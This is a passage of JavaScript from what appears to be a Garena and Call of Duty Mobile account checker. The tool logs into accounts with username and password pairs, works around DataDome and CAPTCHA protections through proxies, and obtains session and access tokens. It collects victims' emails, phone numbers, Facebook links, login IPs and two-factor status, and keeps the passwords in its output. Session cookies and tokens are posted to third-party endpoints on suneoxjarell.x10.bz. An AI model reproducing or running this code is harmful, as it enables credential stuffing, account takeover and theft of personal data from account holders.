        "Referer": "https://auth.garena.com/", "Sec-Fetch-Dest": "document",
        "Sec-Fetch-Mode": "navigate", "Sec-Fetch-Site": "same-site", // Garena is same-site for this redirect
        "Upgrade-Insecure-Requests": "1",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    // Copy sec-ch-ua headers if present
    if (selected_header) {
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) {
                headers[key] = selected_header[key];
            }
        }
    }

    let current_cookies = { ...(cookies_for_codm || {}) };
    let extracted_token = null;

    try {
        let current_url = callback_base_url;
        let current_params_obj = { ...callback_params };
        let redirect_count = 0;
        const max_redirects = 7;

        while (redirect_count < max_redirects) {
            const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
            const axiosConfig = {
                headers: {...headers, 'Cookie': cookieString },
                params: current_params_obj, // Will be null after first redirect
                maxRedirects: 0, // Handle redirects manually
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000,
                validateStatus: (status) => status >= 200 && status < 400 || [301, 302, 303, 307, 308].includes(status), // Allow redirects
            };

            const response = await axios.get(current_url, axiosConfig);
            const { raw: response_text_clean } = parseAxiosResponseData(response.data, "CODM callback"); // Get raw string for captcha check
            const newCookiesFromResponse = parseSetCookies(response.headers['set-cookie']);
            current_cookies = { ...current_cookies, ...newCookiesFromResponse };

            if (detect_captcha_in_response(response_text_clean)) {
                logging.warning(`CAPTCHA DETECTED in CODM callback body (URL: ${current_url.substring(0,100)}...)`);
                return "[🤖] CAPTCHA DETECTED (CODM CALLBACK/REDIRECT BODY)";
            }
            // No need for separate status >= 400 captcha check due to validateStatus

            if ([301, 302, 303, 307, 308].includes(response.status)) { // Handle various redirect codes
                const redirect_url_header = response.headers['location'] || response.headers['Location'];
                if (!redirect_url_header) {
                    logging.error("CODM REDIRECT DETECTED but no Location header.");
                    return "[CODM FAIL] REDIRECT NO LOCATION HEADER";
                }
                // Resolve relative URLs correctly
                const parsedCurrentUrl = new URL(current_url);
                current_url = new URL(redirect_url_header, parsedCurrentUrl.origin + parsedCurrentUrl.pathname).toString();
                current_params_obj = null; // Params are usually not carried over redirects unless in URL
                redirect_count += 1;
                logging.debug(`CODM Redirect #${redirect_count}: to ${current_url.substring(0,100)}...`);
                await time.sleep(0.2); // Small delay
            } else if (response.status >= 200 && response.status < 300) {
                // Successful response, not a redirect
                const final_url = response.request.res.responseUrl || current_url; // Actual final URL
                const parsed_final_url = new URL(final_url);
                const query_params = Object.fromEntries(parsed_final_url.searchParams);
                extracted_token = query_params.token || null;

                if (!extracted_token && response_text_clean) { // Fallback to regex on body
                     const match = /["']token["']\s*:\s*["']([\w\-.]+)["']/.exec(response_text_clean);
                     if (match && match[1]) extracted_token = match[1];
                }
                if (!extracted_token) {
                     logging.warning(`CODM TOKEN EXTRACTION FAILED. Final URL: ${final_url}, Status: ${response.status}, Body Snippet: ${String(response_text_clean).substring(0,200)}`);
                     return "[CODM FAIL] COULD NOT EXTRACT CODM TOKEN";
                }
                break; // Token extracted, exit loop
            } else {
                // Should not happen due to validateStatus, but as a safeguard
                throw new Error(`Unexpected status ${response.status} in CODM callback`);
            }
        } // End redirect loop

        if (redirect_count >= max_redirects) {
            logging.error("MAXIMUM REDIRECTS REACHED during CODM callback.");
            return "[CODM FAIL] MAXIMUM REDIRECTS REACHED";
        }
        
        if (!extracted_token) { // Should be caught earlier, but double check
            logging.error("CODM TOKEN IS NULL after redirect loop, though it should have been extracted or failed earlier.");
            return "[CODM FAIL] TOKEN NULL POST-REDIRECTS";
        }

        // External script call for CODM details
        // WARNING: This calls an external, third-party script. This is a security and reliability risk.
        // Ensure you trust this endpoint or replace it with first-party logic if possible.
        const external_codm_script = "https://suneoxjarell.x10.bz/jajac.php";
        const payload_for_script = {
            "user_agent": headers["User-Agent"], // Use the same UA
            "extracted_token": extracted_token
        };
        const script_headers = {"Content-Type": "application/json", "User-Agent": headers["User-Agent"]};

        try {
            const response_codm = await axios.post(external_codm_script, payload_for_script, {
                headers: script_headers,
                proxy: buildAxiosProxyConfig(proxies),
                timeout: timeout * 1000
            });

            const { data: script_data_obj, error: script_parse_error, raw: script_raw_text } = parseAxiosResponseData(response_codm.data, "CODM external script");
            const response_codm_text_clean = script_raw_text ? script_raw_text.trim() : ""; // Use raw text for checks

            if (detect_captcha_in_response(response_codm_text_clean)) {
                 logging.warning("CAPTCHA DETECTED in external CODM script response.");
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT RESPONSE)";
            }
            if (response_codm.status < 200 || response_codm.status >= 300) {
                throw new Error(`External CODM script HTTP error ${response_codm.status}. Body: ${response_codm_text_clean.substring(0,150)}`);
            }
            // The script returns a pipe-separated string, not JSON
            if (response_codm_text_clean.includes("|") && response_codm_text_clean.split("|").length === 4) {
                const parts = response_codm_text_clean.split("|");
                // Basic validation of parts
                if (/^\d+$/.test(parts[1]) && parts.every(p => p && p.trim() !== "" && p.trim().toLowerCase() !== "n/a")) {
                     logging.info(`CODM script success: ${response_codm_text_clean}`);
                     return response_codm_text_clean; // Return the pipe-separated string
                } else {
                     logging.warning(`CODM script returned parsable but invalid/incomplete data: ${response_codm_text_clean}`);
                     return `[CODM WARN] SCRIPT DATA INVALID: ${response_codm_text_clean.substring(0,100)}`;
                }
            } else {
                 // Handle common error messages from the script
                 const lc_response = response_codm_text_clean.toLowerCase();
                 if (lc_response.includes("not found") || lc_response.includes("invalid token")) {
                     logging.warning(`CODM script: account not linked or invalid token: ${response_codm_text_clean}`);
                     return `[CODM FAIL] ACCOUNT NOT LINKED/TOKEN INVALID`;
                 } else if (lc_response.includes("error") || lc_response.includes("fail")) {
                      logging.warning(`CODM script returned error: ${response_codm_text_clean}`);
                      return `[CODM FAIL] SCRIPT ERROR: ${response_codm_text_clean.substring(0,150)}`;
                 } else {
                      logging.warning(`CODM script returned unexpected format: ${response_codm_text_clean}`);
                      return `[CODM WARN] SCRIPT UNEXPECTED FORMAT: ${response_codm_text_clean.substring(0,100)}`;
                 }
            }
        } catch (e) { // Catch errors from axios.post to external script
             const err_str = strip_ansi_codes(e.message);
             const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
             if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
                 logging.warning(`CAPTCHA DETECTED during external CODM script request error: ${err_str}`);
                 return "[🤖] CAPTCHA DETECTED (CODM EXTERNAL SCRIPT REQUEST ERROR)";
             }
             if (e.code === 'ECONNABORTED') return "[⏱️] [CODM FAIL] CODM CHECK SCRIPT TIMEOUT";
             logging.exception(`Error contacting CODM check script:`, e);
             return `[CODM FAIL] SCRIPT REQUEST ERROR: ${err_str.substring(0,100)}`;
        }

    } catch (e) { // Catch errors from the redirect loop / initial token fetching
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        const status_code = e.response ? e.response.status : null;
        const error_detail = `${err_str.substring(0,100)}` + (status_code ? ` (STATUS: ${status_code})` : "");

        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED during CODM callback request error: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (CODM CALLBACK REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error("CODM callback request timed out.");
            return "[⏱️] [CODM FAIL] CODM CALLBACK TIMEOUT";
        }
        logging.exception(`CODM callback/token fetch error:`, e);
        return `[CODM FAIL] CALLBACK ERROR: ${error_detail}`;
    }
}


async function check_login(account_username, _id, encryptedpassword, password_for_result, selected_header, cookies, dataa_datadome, date, proxies = null, timeout = REQUEST_TIMEOUT) {
    let current_cookies = { ...(cookies || {}) };
    const safe_username = String(account_username || "UNKNOWN_USER").substring(0, 5); // For logging

    if (dataa_datadome) {
        current_cookies["datadome"] = dataa_datadome;
    } else {
        logging.info(`No datadome provided for ${safe_username}, attempting to fetch one.`);
        const manual_datadome_result = await get_datadome_cookie(proxies, timeout);
        if (typeof manual_datadome_result === 'string' && !/^\[[🤖⚠️⏱️🔴]\]/.test(manual_datadome_result)) {
            current_cookies["datadome"] = manual_datadome_result;
            logging.info(`Successfully fetched datadome for ${safe_username}.`);
        } else if (manual_datadome_result && manual_datadome_result.startsWith("[🤖]")) {
            logging.warning(`Manual datadome fetch for login failed (CAPTCHA) for ${safe_username}: ${manual_datadome_result}`);
            return manual_datadome_result; // Propagate CAPTCHA error
        } else if (manual_datadome_result) { // Other errors like timeout/connection
            logging.warning(`Manual datadome fetch for login failed for ${safe_username}: ${manual_datadome_result}.`);
             if (manual_datadome_result.startsWith("[⏱️]") || manual_datadome_result.startsWith("[🔴]")) {
                 return manual_datadome_result; // Propagate critical errors
             }
        } else { // Null or empty datadome
            logging.warning(`Manual datadome fetch for ${safe_username} returned null/empty. Proceeding without it for login.`);
        }
    }
    
    const login_params_obj = {
        'app_id': '100082', 'account': account_username, 'password': encryptedpassword,
        'redirect_uri': REDIRECT_URL, 'format': 'json', 'id': _id,
    };
    // APK_URL should be "https://auth.garena.com/api/login" (base), params are added by axios
    const login_url_with_params = `${APK_URL}?${urllib.parse.urlencode(login_params_obj)}`;


    let response_login;
    try {
        const cookieString = Object.entries(current_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
        const axiosConfig = {
            headers: { ...(selected_header || {}), 'Cookie': cookieString },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000,
        };
        response_login = await axios.get(login_url_with_params, axiosConfig); // GET request
        
    } catch (e) { // Handle axios errors for login request
        const { raw: response_text_on_error } = parseAxiosResponseData(e.response?.data, "Login error response");
        if (e.response && e.response.status >= 400 && detect_captcha_in_response(response_text_on_error)) {
             logging.warning(`CAPTCHA DETECTED in login HTTP error ${e.response.status} body for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (LOGIN HTTP ERROR BODY)";
        }
        if (e.code === 'ECONNABORTED') {
            const msg = e.message.toLowerCase();
            if (msg.includes('connect etimedout') || msg.includes('connection timed out')) {
                logging.error(`Login connection timed out for ${safe_username} (Proxy/Network issue).`);
                return "[⏱️] LOGIN CONNECT TIMEOUT";
            }
            logging.error(`Login read timed out for ${safe_username} (Server slow).`);
            return "[⏱️] LOGIN READ TIMEOUT";
        }
        if (e.isAxiosError && !e.response) { // Network error, no response from server
            logging.error(`Login connection error for ${safe_username}: ${e.message}`);
            return "[🔴] CONNECTION ERROR - SERVER REFUSED";
        }
        if (e.response) { // HTTP error status codes
            const status_code = e.response.status;
            if (status_code === 403) return "[🚫] LOGIN FORBIDDEN (403)";
            if (status_code === 429) return "[🚦] RATE LIMITED (429)";
            logging.warning(`Login HTTP error ${status_code} for ${safe_username}: ${String(response_text_on_error).substring(0,200)}`);
            return `[📉] LOGIN HTTP ERROR ${status_code}`;
        }
        // Other unexpected errors
        const err_str = strip_ansi_codes(e.message);
        if (detect_captcha_in_response(err_str)) {
            logging.warning(`CAPTCHA DETECTED during login request error (message) for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (LOGIN REQUEST ERROR MSG)";
        }
        logging.exception(`Login request failed unexpectedly for ${safe_username}:`, e);
        return `[⚠️] LOGIN REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    // Process successful login response
    const { data: login_json_response, error: login_parse_error, raw: login_raw_text } = parseAxiosResponseData(response_login.data, "Login response");

    if (detect_captcha_in_response(login_raw_text)) { // Check even successful responses for captcha content
        logging.warning(`CAPTCHA DETECTED in login response body (status ${response_login.status}) for ${safe_username}.`);
        return "[🤖] CAPTCHA DETECTED (LOGIN RESPONSE BODY)";
    }
    if (login_parse_error && !login_json_response) { // If parsing failed and no JSON object
        logging.error(`Invalid login JSON for ${safe_username}: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (parse_error)`;
    }
    if (!login_json_response) { // Should not happen if parsing logic is correct
        logging.error(`Login response was null/undefined after parsing for ${safe_username}. Raw: ${login_raw_text.substring(0,200)}`);
        return `[💢] INVALID LOGIN JSON RESPONSE (null_json)`;
    }


    if (login_json_response.error) {
        const error_msg = String(login_json_response.error);
        logging.warning(`Login error field for ${safe_username}: ${error_msg}`);
        if (detect_captcha_in_response(error_msg)) {
            return "[🤖] CAPTCHA REQUIRED (LOGIN ERROR FIELD)";
        }
        // Map Garena's error strings to clearer messages
        if (error_msg.includes("error_password")) return "[⛔] INCORRECT PASSWORD"; 
        if (error_msg.includes("error_account_does_not_exist")) return "[👻] ACCOUNT DOESN'T EXIST";
        if (error_msg.includes("error_account_not_activated")) return "[⏳] ACCOUNT NOT ACTIVATED";
        return `[🚫] LOGIN ERROR: ${error_msg.substring(0, 50)}`; // Keep it concise
    }

    if (!login_json_response.session_key) {
         logging.error(`Login response missing session_key for ${safe_username}: ${json.stringify(login_json_response).substring(0,200)}`);
         return "[❌] LOGIN FAILED: NO SESSION KEY";
    }

    const session_key = login_json_response.session_key;
    const newCookiesFromLogin = parseSetCookies(response_login.headers['set-cookie']);
    current_cookies = { ...current_cookies, ...newCookiesFromLogin };
    logging.info(`Garena login successful for ${safe_username}. Session key obtained.`);
    
    // Account Info fetching from external script
    // WARNING: This calls an external, third-party script. This is a security and reliability risk.
    // It sends cookies and headers to this script.
    const acc_info_script_headers = {
        'Host': 'account.garena.com', 'Connection': 'keep-alive',
        'User-Agent': (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
        'Accept': 'application/json, text/plain, */*',
        'Referer': `https://account.garena.com/?session_key=${session_key}`, // Important referer
        'Accept-Language': 'en-US,en;q=0.9',
    };
    if (selected_header) { // Copy sec-ch-ua headers
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) {
                acc_info_script_headers[key] = selected_header[key];
            }
        }
    }

    const acc_info_script_url = 'https://suneoxjarell.x10.bz/jajak.php';
    const params_for_acc_info_script = {};
    for (const [k, v] of Object.entries(current_cookies)) { params_for_acc_info_script[`coke_${k}`] = v; }
    for (const [k, v] of Object.entries(acc_info_script_headers)) {
        const safe_k = k.replace(/-/g, '_').toLowerCase(); // Sanitize header names for query params
        params_for_acc_info_script[`hider_${safe_k}`] = v;
    }

    let init_json_response = null;
    try {
        const init_response = await axios.get(acc_info_script_url, { 
            params: params_for_acc_info_script, 
            proxy: buildAxiosProxyConfig(proxies), 
            timeout: timeout * 1000 
        });

        const { data: parsed_init_data, error: init_parse_error, raw: init_raw_text } = parseAxiosResponseData(init_response.data, "Account info script response");
        
        if (detect_captcha_in_response(init_raw_text)) {
             logging.warning(`CAPTCHA DETECTED in account info script response for ${safe_username}.`);
             return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT RESPONSE)";
        }
        if (init_response.status < 200 || init_response.status >=300) {
            throw new Error(`Account info script HTTP Error ${init_response.status}. Body: ${init_raw_text.substring(0,150)}`);
        }
        
        if (parsed_init_data) {
            init_json_response = parsed_init_data;
        } else if (init_raw_text) { // If not JSON, try to find embedded JSON
             const json_match = /({.*?})/s.exec(init_raw_text); // Non-greedy match for a JSON object
             if (json_match && json_match[1]) {
                 try {
                     init_json_response = json.parse(json_match[1]);
                 } catch (e) {
                     logging.error(`Failed parsing JSON found within acc info script response for ${safe_username}: ${json_match[1].substring(0,200)} - Error: ${e.message}`);
                     return `[🧩] FAILED ACC INFO PARSE (EMBEDDED JSON INVALID)`;
                 }
             } else {
                 logging.error(`Failed parsing acc info (not JSON or no JSON found) for ${safe_username}: ${init_raw_text.substring(0,200)}`);
                 return `[🧩] FAILED ACC INFO PARSE (NO VALID JSON)`;
             }
        } else {
            logging.error(`Account info script returned empty or unparseable data for ${safe_username}. Status: ${init_response.status}`);
            return `[🧩] FAILED ACC INFO PARSE (EMPTY/UNPARSABLE)`;
        }

    } catch (e) { // Catch errors from axios.get for account info script
        const err_str = strip_ansi_codes(e.message);
        const resp_text = strip_ansi_codes(e.response && e.response.data ? String(e.response.data) : "");
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(resp_text)) {
            logging.warning(`CAPTCHA DETECTED during acc info script request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (ACC INFO SCRIPT REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`Account info script timed out for ${safe_username}`);
            return "[⏱️] ACCOUNT INFO SCRIPT TIMEOUT";
        }
        logging.exception(`Account info script request failed for ${safe_username}:`, e);
        return `[📡] ACC INFO SCRIPT REQUEST FAILED: ${err_str.substring(0,100)}`;
    }

    if (typeof init_json_response !== 'object' || init_json_response === null) {
        logging.error(`Account info processing failed - response was not a dictionary for ${safe_username}`);
        return "[🧩] FAILED ACC INFO PROCESS (INVALID STRUCTURE)";
    }

    if (init_json_response.error || init_json_response.success === false ) {
        const error_detail = init_json_response.error || init_json_response.message || 'Unknown error from acc info script';
        const clean_error_detail = strip_ansi_codes(String(error_detail));
        logging.warning(`Account info script returned error for ${safe_username}: ${clean_error_detail}`);
        if (detect_captcha_in_response(clean_error_detail)) {
            return "[🤖] CAPTCHA REQUIRED (ACC INFO SCRIPT ERROR FIELD)";
        }
        return `[❓] ACC INFO ERROR: ${clean_error_detail.substring(0,150)}`;
    }
    
    // Extracting details from init_json_response.bindings
    // This part is highly dependent on the external script's output format.
    const bindings = init_json_response.bindings || [];
    const account_status = strip_ansi_codes(String(init_json_response.status || 'Unknown'));
    let country = "N/A", last_login = "N/A", last_login_where = "N/A", avatar_url = "N/A";
    let fb_name = "N/A", fb_link = "N/A", mobile = "N/A", email = "N/A";
    let facebook_bound = "False", email_verified = "False", authenticator_enabled = "False", two_step_enabled = "False";
    let shell = "0", ckz_count = "UNKNOWN", last_login_ip = "N/A";

    if (Array.isArray(bindings)) {
        for (const binding_item_str of bindings) {
            const binding_clean = strip_ansi_codes(String(binding_item_str));
            if (binding_clean.includes(":")) {
                try {
                    const [key_raw, ...value_parts] = binding_clean.split(":");
                    const key = key_raw.trim().toLowerCase(); 
                    const value = value_parts.join(":").trim(); // Rejoin if value had colons
                    if (!value) continue; // Skip if value is empty
                    
                    // Simplified assignments
                    if (key === "country") country = value;
                    else if (key === "lastlogin" && !key.includes("from") && !key.includes("ip")) last_login = value;
                    else if (key === "lastloginfrom") last_login_where = value;
                    else if (key === "lastloginip") last_login_ip = value;
                    else if (key === "ckz") ckz_count = value;
                    else if (key === "garena shells") shell = (/\d+/.exec(value) || ["0"])[0];
                    else if (key === "facebook account" && value !== "N/A") { fb_name = value; facebook_bound = "True"; }
                    else if (key === "fb link") fb_link = value;
                    else if (key === "avatar") avatar_url = value;
                    else if (key === "mobile number" && value !== "N/A") mobile = value;
                    else if (key === "tae") email_verified = value.toLowerCase().includes("yes") ? "True" : "False"; // Email verified?
                    else if (key === "eta" && value !== "N/A") email = value; // Email address
                    else if (key === "authenticator") authenticator_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                    else if (key === "two-step verification") two_step_enabled = value.toLowerCase().includes("enabled") ? "True" : "False";
                } catch (parse_err) {
                    logging.warning(`Error parsing binding line for ${safe_username}: '${binding_clean.substring(0,50)}...' - ${parse_err.message}`);
                }
            }
        }
    } else {
        logging.warning(`Bindings data from script was not an array for ${safe_username}: ${String(bindings).substring(0,100)}`);
    }
    
    // Country normalization
    const original_binding_country = country; // Keep for reference
    if (!country || ["N/A", "UNKNOWN", "NONE", ""].includes(String(country).toUpperCase())) {
        country = "UNKNOWN"; // Default if not found or explicitly N/A
        if (last_login_where && last_login_where !== "N/A") {
            const llw_upper = last_login_where.toUpperCase();
            const parts = llw_upper.split(',').map(p => p.trim());
            const potential_country_from_llw = parts[parts.length - 1]; // Last part often country
            const mapped_from_llw = GARENA_COUNTRY_MAP[potential_country_from_llw];
            if (mapped_from_llw) {
                country = mapped_from_llw;
            } else { // Broader search in llw parts
                for (const p_part of parts) {
                    if (GARENA_COUNTRY_MAP[p_part]) { country = GARENA_COUNTRY_MAP[p_part]; break; }
                }
            }
        }
    } else { // If country was found, try to normalize it
        const normalized = GARENA_COUNTRY_MAP[String(country).toUpperCase()];
        country = normalized || String(country).toUpperCase(); // Use normalized or original uppercase
    }
    
    // Grant token step
    const grant_cookies = {};
    ['datadome', 'sso_key'].forEach(key => { // Only specific cookies needed for grant
        if (current_cookies[key]) grant_cookies[key] = current_cookies[key];
    });

    const grant_headers = {
        "Host": "auth.garena.com", "Connection": "keep-alive",
        "Accept": "application/json, text/plain, */*",
        "Content-Type": "application/x-www-form-urlencoded;charset=UTF-8",
        "Origin": "https://auth.garena.com", "Sec-Fetch-Site": "same-origin",
        "Sec-Fetch-Mode": "cors", "Sec-Fetch-Dest": "empty",
        "Referer": "https://auth.garena.com/universal/oauth?all_platforms=1&response_type=token&locale=en-SG&client_id=100082&redirect_uri=" + urllib.parse.quote(REDIRECT_URL),
        "Accept-Encoding": "gzip, deflate, br, zstd", "Accept-Language": "en-US,en;q=0.9",
        "User-Agent": (selected_header && selected_header["User-Agent"]) || "Mozilla/5.0",
    };
    if (selected_header) { // Copy sec-ch-ua headers
        for (const key in selected_header) {
            if (key.toLowerCase().startsWith('sec-ch-ua')) {
                grant_headers[key] = selected_header[key];
            }
        }
    }
    const grant_data_payload_obj = {"client_id": "100082", "response_type": "token", "redirect_uri": REDIRECT_URL, "format": "json", "id": _id};
    const grant_data_payload_str = urllib.parse.urlencode(grant_data_payload_obj);

    let grant_response;
    try {
        const grant_url = "https://auth.garena.com/oauth/token/grant";
        const cookieStringGrant = Object.entries(grant_cookies).map(([k, v]) => `${k}=${v}`).join('; ');

        grant_response = await axios.post(grant_url, grant_data_payload_str, {
            headers: { ...grant_headers, 'Cookie': cookieStringGrant },
            proxy: buildAxiosProxyConfig(proxies),
            timeout: timeout * 1000
        });
        
        const { data: grant_data_json, error: grant_parse_error, raw: grant_raw_text } = parseAxiosResponseData(grant_response.data, "Grant token response");

        if (detect_captcha_in_response(grant_raw_text)) {
            logging.warning(`CAPTCHA DETECTED in grant token response body for ${safe_username}.`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN RESPONSE BODY)";
        }
        if (grant_parse_error && !grant_data_json) {
            logging.error(`Invalid grant token JSON for ${safe_username}: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NON-JSON RESPONSE (${grant_parse_error.message.substring(0,50)})`;
        }
        if (!grant_data_json) {
            logging.error(`Grant token response was null/undefined after parsing for ${safe_username}. Raw: ${grant_raw_text.substring(0,200)}`);
            return `[📄] GRANT TOKEN FAILED: NULL JSON RESPONSE`;
        }


        if (grant_data_json.error) {
            const error_msg = String(grant_data_json.error);
            logging.warning(`Grant token error field for ${safe_username}: ${error_msg}`);
            if (detect_captcha_in_response(error_msg)) {
                return "[🤖] CAPTCHA REQUIRED (GRANT TOKEN ERROR FIELD)";
            }
            return `[🔑] GRANT TOKEN FAILED: ${error_msg.substring(0,50)}`;
        }

        if (!grant_data_json.access_token) {
            logging.error(`Grant token response missing access_token for ${safe_username}: ${json.stringify(grant_data_json).substring(0,200)}`);
            return "[❓] GRANT TOKEN MISSING 'access_token'";
        }

        const access_token = grant_data_json.access_token;
        const newCookiesFromGrant = parseSetCookies(grant_response.headers['set-cookie']);
        current_cookies = { ...current_cookies, ...newCookiesFromGrant }; // Merge cookies
        logging.info(`Access token granted for ${safe_username}.`);
        
        // Prepare cookies for CODM check (show_level)
        const codm_check_cookies = {};
        ['datadome', 'sso_key', 'token_session'].forEach(key => { // Specific cookies for CODM
            if (current_cookies[key]) codm_check_cookies[key] = current_cookies[key];
        });
        
        const codm_result_str = await show_level(access_token, selected_header, codm_check_cookies, proxies, timeout);

        if (codm_result_str.startsWith("[🤖]")) { // CAPTCHA from CODM check
             logging.warning(`CODM check phase returned CAPTCHA for ${safe_username}: ${codm_result_str}`);
             return codm_result_str;
        }
        if (/^\[(CODM FAIL|CODM WARN|⏱️)\]/.test(codm_result_str)) { // Failure or warning from CODM check
            logging.warning(`CODM check failed or warned for ${safe_username}: ${codm_result_str}`);
            return ["CODM_FAILURE", account_username, password_for_result, codm_result_str]; // Special array for partial success
        }

        // Parse CODM result string (e.g., "Nickname|Level|Region|UID")
        let codm_nickname = "N/A", codm_level_str = "N/A", codm_region = "N/A", uid = "N/A";
        const connected_games_list_for_json = [];

        if (typeof codm_result_str === 'string' && codm_result_str.includes("|") && codm_result_str.split("|").length === 4) {
            const parts = codm_result_str.split("|");
            [codm_nickname, codm_level_str, codm_region, uid] = parts.map(p => p.trim()); // Trim parts
            
            // Validate parsed CODM data
            if (/^\d+$/.test(codm_level_str) && codm_nickname && codm_region && uid &&
               ![codm_nickname, codm_region, uid].some(p => !p || p.toLowerCase() === "n/a")) {
                connected_games_list_for_json.push({
                    "game": "CODM", "region": codm_region, "level": codm_level_str, // level is string here, converted in format_result_dict
                    "nickname": codm_nickname, "uid": uid
                });
            } else {
                const reason = `[CODM WARN] PARSED INVALID CODM DATA: ${codm_result_str.substring(0,100)}`;
                logging.warning(`CODM check for ${safe_username} resulted in: ${reason}`);
                return ["CODM_FAILURE", account_username, password_for_result, reason];
            }
        } else { // Unexpected CODM data format
            const reason = `[CODM WARN] UNEXPECTED CODM DATA: ${String(codm_result_str).substring(0,100)}`;
            logging.warning(`CODM check for ${safe_username} resulted in: ${reason}`);
            return ["CODM_FAILURE", account_username, password_for_result, reason];
        }
        
        const result_dict = format_result_dict(
            last_login, last_login_where, country, shell, avatar_url, mobile,
            facebook_bound, email_verified, authenticator_enabled, two_step_enabled,
            connected_games_list_for_json, fb_name, fb_link, email, date,
            account_username, password_for_result, // Pass original password for result
            ckz_count, last_login_ip, account_status
        );
        logging.info(`Full check successful for ${safe_username}. CODM Level: ${codm_level_str}`);
        return result_dict;

    } catch (e) { // Catch errors from grant token axios.post
        const { raw: grant_text_on_error } = parseAxiosResponseData(e.response?.data, "Grant token error response");
        const err_str = strip_ansi_codes(e.message);
        
        if (detect_captcha_in_response(err_str) || detect_captcha_in_response(grant_text_on_error)) {
            logging.warning(`CAPTCHA DETECTED during grant token request error for ${safe_username}: ${err_str}`);
            return "[🤖] CAPTCHA DETECTED (GRANT TOKEN REQUEST ERROR)";
        }
        if (e.code === 'ECONNABORTED') {
            logging.error(`Grant token request timed out for ${safe_username}`);
            return "[⏱️] GRANT TOKEN REQUEST TIMEOUT";
        }
        // Log full error for grant token step
        logging.exception(`Grant token request error for ${safe_username}:`, e);
        return `[🌐] GRANT TOKEN REQUEST ERROR: ${err_str.substring(0,100)}`;
    }
}

function format_result_dict(last_login, last_login_where, country, shell_str, avatar_url, mobile,
                       facebook_bound_str, email_verified_str, authenticator_enabled_str, two_step_enabled_str,
                       connected_games_data, fb_name, fb_link, email, date_timestamp, // Renamed 'date' to 'date_timestamp'
                       username, password, // Password included here, removed by API handler before sending to client
                       ckz_count, last_login_ip, account_status) {
    
    let codm_info_json = {"status": "NO CODM INFO PARSED", "level": null}; // Default
    if (Array.isArray(connected_games_data) && connected_games_data.length > 0) {
        const game_data = connected_games_data[0]; // Assuming first game is CODM if present
        if (game_data && game_data.game === "CODM") {
            let level_val = null;
            try { level_val = parseInt(game_data.level, 10); if(isNaN(level_val)) level_val = null; }
            catch (e) { /* ignore, level_val remains null */ }
            codm_info_json = {
                "status": "LINKED", "game": "CODM", 
                "region": game_data.region || null,
                "level": level_val, 
                "nickname": game_data.nickname || null, 
                "uid": game_data.uid || null
            };
        }
    }

    let shell_value = 0;
    try { shell_value = parseInt(shell_str, 10); if(isNaN(shell_value)) shell_value = 0; }
    catch (e) { /* ignore, shell_value remains 0 */ }

    function clean_na(value) { // Helper to convert "N/A" or empty to null
        const sVal = String(value);
        return (value && !["N/A", "UNKNOWN", ""].includes(sVal.toUpperCase())) ? value : null;
    }

    const result_data = {
        "checker_by": "S1N | TG: @YISHUX",
        "timestamp_utc": DateTime.now().toISO(), // Current ISO timestamp
        "check_run_id": date_timestamp, // Original timestamp from when the check was initiated
        "username": username, 
        "password": password, // IMPORTANT: This should be removed before sending to the client.
        "account_status_garena": clean_na(account_status),
        "account_country": clean_na(country),
        "garena_shells": shell_value,
        "avatar_url": clean_na(avatar_url),
        "last_login_time": clean_na(last_login),
        "last_login_location": clean_na(last_login_where),
        "last_login_ip": clean_na(last_login_ip),
        "bindings": {
            "mobile_number": clean_na(mobile),
            "email_address": clean_na(email),
            "facebook_name": clean_na(fb_name),
            "facebook_link": clean_na(fb_link),
        },
        "security": {
            "mobile_bound": !!clean_na(mobile), // True if mobile number exists and is not "N/A"
            "email_verified": email_verified_str === "True",
            "facebook_linked": facebook_bound_str === "True",
            "google_authenticator_enabled": authenticator_enabled_str === "True",
            "two_step_verification_enabled": two_step_enabled_str === "True",
        },
        "codm_details": codm_info_json,
        "ckz_count": ckz_count !== "UNKNOWN" ? clean_na(ckz_count) : null,
    };
    return result_data;
}

async function check_account(username, password, date_timestamp, initial_cookies_tuple, proxies = null, datadome_for_prelogin_attempt = null, timeout = REQUEST_TIMEOUT) {
    const safe_username = String(username || "UNKNOWN_USER").substring(0, 5); // For logging
    try {
        const random_id = String(random.randint(100000000000, 999999999999));
        const [initial_cookies_from_system, headers_template] = get_request_data(initial_cookies_tuple); 
        let prelogin_request_cookies = { ...initial_cookies_from_system };

        if (datadome_for_prelogin_attempt) {
            prelogin_request_cookies['datadome'] = datadome_for_prelogin_attempt;
        }

        const params_obj_prelogin = {"app_id": "100082", "account": username, "format": "json", "id": random_id};
        const prelogin_url = "https://auth.garena.com/api/prelogin";
        let v1 = null, v2 = null;
        let encrypted_password_val = null;
        let datadome_from_prelogin_response = null;
        let response_prelogin = null;

        try {
            const cookieStringPrelogin = Object.entries(prelogin_request_cookies).map(([k, v]) => `${k}=${v}`).join('; ');
